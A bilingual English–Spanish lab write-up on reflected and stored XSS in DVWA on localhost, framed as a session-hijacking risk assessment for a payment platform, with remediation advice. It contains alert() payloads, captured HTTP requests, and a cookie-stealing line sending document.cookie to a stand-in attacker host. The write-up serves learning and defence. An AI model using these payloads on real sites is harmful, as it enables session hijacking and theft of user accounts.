# Cross-Site Scripting (XSS) - Secuestro de Sesion

## [ENGLISH]

# XSS Vulnerabilities in Payment Interfaces: Session Hijacking Risk Assessment

## Executive Summary
Discovered and exploited Cross-Site Scripting (XSS) vulnerabilities that could enable session hijacking in payment processing interfaces. In a fintech environment like Clip, these vulnerabilities could lead to unauthorized access to merchant accounts and financial data theft.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Type | CWE-79: Cross-Site Scripting |
| Severity | HIGH (CVSS 7.1) |
| Variants Found | Reflected XSS, Stored XSS |
| Attack Vector | Network |
| User Interaction | Required (Reflected) / None (Stored) |

## Technical Analysis

### Reflected XSS
**Location:** /vulnerabilities/xss_r/?name=

**Payload:**
```
<script>alert('XSS')</script>
```

**HTTP Request captured in Burp Suite:**
```
GET /dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script> HTTP/1.1
Host: 127.0.0.1
```

**Result:** JavaScript executed immediately, popup displayed.

### Stored XSS
**Location:** /vulnerabilities/xss_s/ (Guestbook form)

**Payload:**
```
<script>alert('Captured')</script>
```

**HTTP Request captured in Burp Suite:**
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

txtName=burp+test&mtxMessage=%3Cscript%3Ealert%28%27Captured%27%29%3C%2Fscript%3E
```

**Result:** Payload stored in database, executes for ALL users visiting the page.

## XSS Types Comparison

| Type | Persistence | Victim Interaction | Risk Level |
|------|-------------|-------------------|------------|
| Reflected | None | Must click malicious link | Medium |
| Stored | Database | Just visit the page | Critical |

## Fintech Impact Scenario (Clip)

### Attack Chain for Payment Platform:
1. Attacker finds Stored XSS in merchant dashboard (transaction comments, product descriptions)
2. Injects session-stealing payload:
```javascript

new Image().src='https://attacker.com/steal?cookie='+document.cookie;

```
3. Merchant visits dashboard, cookie sent to attacker
4. Attacker hijacks session, accesses merchant funds

### Business Impact:
- Direct Financial Loss: Unauthorized transfers from merchant accounts
- Data Breach: Access to transaction history, customer payment data
- Regulatory Fines: PCI-DSS violation (Requirement 6.5.7)
- Reputation Damage: Loss of merchant trust

### Estimated Risk for 100,000 merchants:
- If 0.1% accounts compromised = 100 merchants
- Average merchant balance: $5,000 USD
- Potential loss: $500,000 USD

## Remediation

### Immediate:
```php
// Instead of:
echo "Hello " . $_GET['name'];

// Use:
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

### Long-term:
1. Implement Content Security Policy (CSP) headers
2. Use HTTPOnly and Secure flags on session cookies
3. Input validation on all user-supplied data
4. Output encoding based on context (HTML, JavaScript, URL)

## Tools Used
- Burp Suite Community Edition (proxy, HTTP history)
- Firefox Developer Tools
- DVWA (Damn Vulnerable Web Application)

## References
- OWASP XSS Prevention Cheat Sheet
- CWE-79: Improper Neutralization of Input During Web Page Generation
- PCI-DSS Requirement 6.5.7

---

## [ESPANOL]

# Vulnerabilidades XSS en Interfaces de Pago: Evaluacion de Riesgo de Secuestro de Sesion

## Resumen Ejecutivo
Se descubrieron y explotaron vulnerabilidades de Cross-Site Scripting (XSS) que podrian permitir el secuestro de sesiones en interfaces de procesamiento de pagos. En un entorno fintech como Clip, estas vulnerabilidades podrian llevar a acceso no autorizado a cuentas de comerciantes y robo de datos financieros.

## Detalles de la Vulnerabilidad

| Campo | Valor |
|-------|-------|
| Tipo | CWE-79: Cross-Site Scripting |
| Severidad | ALTA (CVSS 7.1) |
| Variantes Encontradas | XSS Reflejado, XSS Almacenado |
| Vector de Ataque | Red |
| Interaccion de Usuario | Requerida (Reflejado) / Ninguna (Almacenado) |

## Analisis Tecnico

### XSS Reflejado
**Ubicacion:** /vulnerabilities/xss_r/?name=

**Payload:**
```
<script>alert('XSS')</script>
```

**Solicitud HTTP capturada en Burp Suite:**
```
GET /dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script> HTTP/1.1
Host: 127.0.0.1
```

**Resultado:** JavaScript ejecutado inmediatamente, popup mostrado.

### XSS Almacenado
**Ubicacion:** /vulnerabilities/xss_s/ (Formulario Guestbook)

**Payload:**
```
<script>alert('Captured')</script>
```

**Solicitud HTTP capturada en Burp Suite:**
```
POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

txtName=burp+test&mtxMessage=%3Cscript%3Ealert%28%27Captured%27%29%3C%2Fscript%3E
```

**Resultado:** Payload almacenado en base de datos, se ejecuta para TODOS los usuarios que visiten la pagina.

## Comparacion de Tipos de XSS

| Tipo | Persistencia | Interaccion de Victima | Nivel de Riesgo |
|------|--------------|------------------------|-----------------|
| Reflejado | Ninguna | Debe hacer click en link malicioso | Medio |
| Almacenado | Base de datos | Solo visitar la pagina | Critico |

## Escenario de Impacto Fintech (Clip)

### Cadena de Ataque para Plataforma de Pagos:
1. Atacante encuentra XSS Almacenado en dashboard de comerciante (comentarios de transacciones, descripciones de productos)
2. Inyecta payload para robar sesion:
```javascript

new Image().src='https://atacante.com/robar?cookie='+document.cookie;

```
3. Comerciante visita dashboard, cookie enviada al atacante
4. Atacante secuestra sesion, accede a fondos del comerciante

### Impacto de Negocio:
- Perdida Financiera Directa: Transferencias no autorizadas desde cuentas de comerciantes
- Filtracion de Datos: Acceso a historial de transacciones, datos de pago de clientes
- Multas Regulatorias: Violacion de PCI-DSS (Requisito 6.5.7)
- Dano Reputacional: Perdida de confianza de comerciantes

### Riesgo Estimado para 100,000 comerciantes:
- Si 0.1% de cuentas comprometidas = 100 comerciantes
- Balance promedio por comerciante: $5,000 USD
- Perdida potencial: $500,000 USD

## Remediacion

### Inmediata:
```php
// En lugar de:
echo "Hello " . $_GET['name'];

// Usar:
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

### Largo Plazo:
1. Implementar headers de Content Security Policy (CSP)
2. Usar banderas HTTPOnly y Secure en cookies de sesion
3. Validacion de entrada en todos los datos proporcionados por usuario
4. Codificacion de salida basada en contexto (HTML, JavaScript, URL)

## Herramientas Utilizadas
- Burp Suite Community Edition (proxy, historial HTTP)
- Firefox Developer Tools
- DVWA (Damn Vulnerable Web Application)

## Referencias
- OWASP XSS Prevention Cheat Sheet
- CWE-79: Improper Neutralization of Input During Web Page Generation
- PCI-DSS Requisito 6.5.7

---
**Autor / Author:** Francisco Escalante
**Fecha / Date:** Enero / January 2026
**Entorno / Environment:** DVWA on Parrot OS
**GitHub:** github.com/Paxx16/cybersecurity-journey


	






















































